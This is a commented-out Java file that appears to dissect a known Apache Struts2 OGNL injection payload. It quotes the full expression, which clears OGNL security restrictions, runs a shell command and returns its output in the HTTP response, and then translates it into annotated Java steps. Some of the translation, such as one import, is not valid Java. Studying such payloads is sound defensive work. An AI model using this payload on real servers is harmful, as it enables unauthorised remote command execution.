//package org.ketchupfactory.example;
//
//import com.opensymphony.xwork2.ActionContext;
//import com.opensymphony.xwork2.inject.Container;
//import com.opensymphony.xwork2.inject.Context;
//import com.opensymphony.xwork2.ognl.OgnlUtil;
//import ognl;
//import ognl.MemberAccess;
//import ognl.OgnlContext;
//import org.apache.commons.io.IOUtils;
//import org.apache.struts2.ServletActionContext;
//
//import javax.servlet.ServletOutputStream;
//import javax.servlet.ServletResponse;
//import java.io.IOException;
//import java.util.List;
//
//public class MiscTest {
//
//    static MemberAccess _memberAccess;
//
//    public static void main(String[] args) throws IOException {
////        ${(#_="multipart/form-data").(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context["com.opensymphony.xwork2.ActionContext.container"]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd="whoami").(#iswin=(@java.lang.System@getProperty("os.name").toLowerCase().contains("win"))).(#cmds=(#iswin?{"cmd.exe","/c",#cmd}:{"/bin/bash","-c",#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
//
//        // Step 1: set Content-Type
//        String Normal = "multipart/form-data";
//
//        // Step 2 and 3 is a procedure specific in OGNL, not applicable to Java code
//        // But we will still roughly translate it to Java (may not be 100% accurate)
//
//        // Step 2: Set Default Member Access
//        MemberAccess dm = OgnlContext.DEFAULT_MEMBER_ACCESS;
//
//        // Step 3: Remove security restrictions in OGNL processing
//        if (_memberAccess == null) {
//            _memberAccess = dm;
//        } else {
//            ActionContext context = ActionContext.getContext();
//            Container container = context.getContainer();
//            OgnlUtil ognlUtil = container.getInstance(OgnlUtil.class);
//            ognlUtil.getExcludedPackageNames().clear(); // Remove security restrictions in OGNL processing
//            ognlUtil.getExcludedClasses().clear();      // Remove security restrictions in OGNL processing
//            context.setMemberAccess(dm);
//        }
//
//        // Step 4: Bash command to execute
//        String cmd = "whoami";
//
//        // Step 5: Pick a command-line shell to execute the command
//        boolean isWin = System.getProperty("os.name").toLowerCase().contains("win");    // Executing on Windows OS
//        String[] cmds =
//                isWin ?
//                        new String[]{"cmd.exe", "/c", cmd} :    // Run command using cmd.exe
//                        new String[]{"/bin/bash", "-c", cmd};   // Run command using bash
//
//        // Step 6: Configure and launch a process to run the shell script in step 5
//        ProcessBuilder p = new ProcessBuilder(cmds);
//        p.redirectErrorStream(true);
//        Process process = p.start();
//
//        // Step 7: Capture output of shell script, mount on server response to send back
//        ServletOutputStream ros = ServletActionContext.getResponse().getOutputStream();
//        IOUtils.copy(process.getInputStream(), ros);
//        ros.flush();
//    }
//}
